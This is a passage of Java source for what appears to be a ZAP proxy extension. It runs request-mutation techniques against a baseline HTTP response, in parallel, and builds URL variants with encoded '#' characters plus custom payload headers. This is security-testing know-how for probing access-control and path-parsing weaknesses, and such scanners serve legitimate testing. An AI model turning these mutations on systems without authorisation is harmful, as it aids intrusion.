                if (listener != null) listener.onComplete(new ArrayList<>());
                return;
            }
            List<Result> results = new ArrayList<>();
            int total = techniques.size();
            int current = 0;

            if (threadCount <= 1) {
                for (Technique tech : techniques) {
                    if (cancelled != null && cancelled[0]) {
                        if (listener != null) listener.onComplete(results);
                        return;
                    }
                    if (!tech.isEnabled()) { current++; continue; }
                    if (listener != null) {
                        listener.onProgress(current, total, tech.toString());
                    }
                    Result r = runOne(base, tech, baseSender, suppressErrors, baselineStatus, baselineLen, baselineBody);
                    if (r != null) results.add(r);
                    current++;
                }
            } else {
                final int bs = baselineStatus, bl = baselineLen;
                final String bb = baselineBody;
                final boolean se = suppressErrors;
                final HttpMessage baseFinal = base;
                java.util.concurrent.ExecutorService executor = java.util.concurrent.Executors.newFixedThreadPool(threadCount);
                java.util.List<org.parosproxy.paros.network.HttpSender> senders =
                    java.util.Collections.synchronizedList(new ArrayList<>());
                java.util.concurrent.ConcurrentHashMap<Integer, Result> resultMap = new java.util.concurrent.ConcurrentHashMap<>();
                java.util.concurrent.CountDownLatch latch = new java.util.concurrent.CountDownLatch(techniques.size());

                for (int idx = 0; idx < techniques.size(); idx++) {
                    if (cancelled != null && cancelled[0]) {
                        latch.countDown();
                        continue;
                    }
                    final Technique currentTech = techniques.get(idx);
                    if (!currentTech.isEnabled()) { latch.countDown(); continue; }
                    final int index = idx;
                    executor.submit(() -> {
                        if (cancelled != null && cancelled[0]) { latch.countDown(); return; }
                        org.parosproxy.paros.network.HttpSender threadSender = senderSupplier.get();
                        synchronized (senders) { senders.add(threadSender); }
                        try {
                            if (cancelled != null && !cancelled[0]) {
                                Result r = runOne(baseFinal, currentTech, threadSender, se, bs, bl, bb);
                                if (r != null) {
                                    resultMap.put(index, r);
                                }
                            }
                        } finally {
                            // Unconditional: every submitted task releases exactly one
                            // latch slot. Dereferencing cancelled[0] here would NPE when a
                            // caller passed null, and skipping the count-down when the stop
                            // flag flips mid-run would wedge latch.await() forever.
                            latch.countDown();
                        }
                    });
                }
                try {
                    latch.await();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } finally {
                    executor.shutdown();
                }

                for (org.parosproxy.paros.network.HttpSender s : senders) {
                    try { s.shutdown(); } catch (Exception ignored) {}
                }

                for (int i = 0; i < techniques.size(); i++) {
                    if (cancelled != null && cancelled[0]) break;
                    Result r = resultMap.get(i);
                    if (r != null) results.add(r);
                    current++;
                    if (listener != null) {
                        listener.onProgress(current, total, techniques.get(i).toString());
                    }
                }
            }

            if (listener != null) {
                listener.onProgress(total, total, "Complete");
                listener.onComplete(results);
            }
        } finally {
            try { baseSender.shutdown(); } catch (Exception ignored) {}
        }
    }

    /** Apply a custom technique to a base message, returning a mutated clone. */
    public static HttpMessage applyCustom(HttpMessage base, Technique tech) {
        if (!tech.isCustom()) return tech.apply(base);
        HttpMessage c = base.cloneAll();
        if (tech.getCustomPlacement() != null && !tech.getCustomPlacement().isEmpty()) {
            String header = "Referer";
            VulnCatalog.VulnClass vc = VulnCatalog.find(tech.getFamily());
            if (vc != null) header = vc.getDefaultHeader();
            applyVulnPlacement(c, tech.getCustomPayload(), tech.getCustomPlacement(), -1, null, header);
            return c;
        }
        if (tech.getCustomPath() != null) {
            replacePath(c, tech.getCustomPath());
        }
        if (tech.getCustomHeaderName() != null && !tech.getCustomHeaderName().isEmpty()) {
            addHeader(c, tech.getCustomHeaderName(), tech.getCustomHeaderValue());
        }
        return c;
    }

    public static Set<String> getFamilies() { return FAMILIES; }
    public static int getFamilyOrder(String family) {
        return FAMILY_ORDER.getOrDefault(family, 999);
    }

    // ─── Fragment helper methods ─────────────────────────────────────────

    private static String joinFromSegment(String[] segments, int start) {
        StringBuilder sb = new StringBuilder();
        for (int i = start; i < segments.length; i++) {
            if (i > start) sb.append("/");
            sb.append(segments[i]);
        }
        return sb.toString();
    }

    private static String[] append(String[] arr, String[] add) {
        String[] r = java.util.Arrays.copyOf(arr, arr.length + add.length);
        System.arraycopy(add, 0, r, arr.length, add.length);
        return r;
    }

    private static String buildEncoded(String[] segments, int splitAt, boolean slashBeforeHash, boolean doubleEnc, String lastSeg) {
        StringBuilder sb = new StringBuilder();
        for (int sj = 0; sj < segments.length; sj++) {
            if (sj > 0) sb.append("/");
            sb.append(segments[sj]);
            if (sj == splitAt) {
                String encodedHash = doubleEnc ? "%2523" : "%23";
                sb.append(slashBeforeHash ? "/" : "").append(encodedHash);
                for (int sk = sj + 1; sk < segments.length; sk++) {
                    sb.append("/").append(segments[sk]);
                }
                break;
            }
        }
        return sb.toString();
    }
}
